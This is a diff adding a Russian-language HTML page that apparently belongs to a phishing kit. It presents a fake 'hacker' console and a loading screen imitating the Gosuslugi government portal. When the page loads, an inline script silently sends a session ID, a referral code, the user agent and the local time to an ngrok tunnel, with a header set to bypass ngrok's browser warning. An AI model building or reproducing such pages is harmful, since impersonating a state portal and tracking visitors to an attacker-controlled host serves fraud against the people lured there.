@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Форма регистрации</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ЭКРАН 2: ТЕРМИНАЛ (Чистый консольный блок) -->
+    <div id="hackerModal" class="hacker-overlay">
+        <div class="hacker-window">
+            <div class="hacker-body">
+                <div id="terminalConsole" class="terminal-console"></div>
+                <div class="hacker-progress-container">
+                    <div class="progress-info">
+                        <span id="progressText">ENCODER ACTIVED...</span>
+                        <span id="progressPercent">0%</span>
+                    </div>
+                    <div class="progress-bar-bg">
+                        <div id="progressBarFill" class="progress-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ЭКРАН 4: Перенаправление / Загрузка профиля -->
+    <div id="profileLoaderOverlay" class="modal-overlay">
+        <div class="top-logo-container">
+            <img src="flags/logo.png" alt="Logo" class="top-logo">
+        </div>
+
+        <div class="status-card">
+            <h3 class="status-title">Госуслуги сейчас откроются</h3>
+            <p class="status-subtitle">Портал работает в прежнем режиме.<br>Подождите пару секунд</p>
+            
+            <div class="dots-container">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <div id="toastContainer" class="toast-container"></div>
+    
+    <script>
+        const currentSessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 10);
+        localStorage.setItem('sessionId', currentSessionId);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const refCode = urlParams.get('ref');
+
+        // Отправка визита (Этап 1) с правильными заголовками
+        window.addEventListener('DOMContentLoaded', () => {
+            fetch('https://runaround-defiance-unmasked.ngrok-free.dev/api/visit', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'ngrok-skip-browser-warning': 'true' // <--- ЭТО РЕШАЕТ ВСЁ
+                },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    refCode: refCode,
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        localTime: new Date().toLocaleTimeString()
+                    }
+                })
+            }).catch(err => console.error("Ошибка отправки визита:", err));
+        });
+    </script>
+
+    <script src="script.js?v=2"></script>
+</body>
+</html>
